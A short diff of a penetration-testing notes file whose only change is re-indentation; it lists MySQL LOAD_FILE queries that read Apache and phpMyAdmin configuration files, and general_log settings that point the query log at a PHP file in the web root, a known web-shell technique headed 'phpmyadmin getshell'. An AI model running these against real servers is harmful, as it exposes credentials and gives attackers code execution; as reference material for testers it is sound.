@@ -9,19 +9,19 @@ Tips
 
 ::
 
-select load_file('/var/www/html/index.html')
-select load_file('/etc/apache2/apache2.conf')
-select load_file('/etc/phpmyadmin/config.inc.php')
-select load_file('/usr/share/phpmyadmin/index.php')
-SELECT LOAD_FILE( '/usr/share/phpmyadmin/phpinfo.php' )
-SELECT LOAD_FILE( '/etc/apache2/sites-enabled/000-default.conf' )
-SELECT LOAD_FILE( '/etc/apache2/sites-available/000-default.conf' )
-SELECT LOAD_FILE( '/etc/apache2/conf-available/serve-cgi-bin.conf' )
+	select load_file('/var/www/html/index.html')
+	select load_file('/etc/apache2/apache2.conf')
+	select load_file('/etc/phpmyadmin/config.inc.php')
+	select load_file('/usr/share/phpmyadmin/index.php')
+	SELECT LOAD_FILE( '/usr/share/phpmyadmin/phpinfo.php' )
+	SELECT LOAD_FILE( '/etc/apache2/sites-enabled/000-default.conf' )
+	SELECT LOAD_FILE( '/etc/apache2/sites-available/000-default.conf' )
+	SELECT LOAD_FILE( '/etc/apache2/conf-available/serve-cgi-bin.conf' )
 
 ::
 
-set global general_log = "ON";
-set global general_log_file='/var/www/html/index.php';
+	set global general_log = "ON";
+	set global general_log_file='/var/www/html/index.php';
 
 
 phpmyadmin getshell姿势
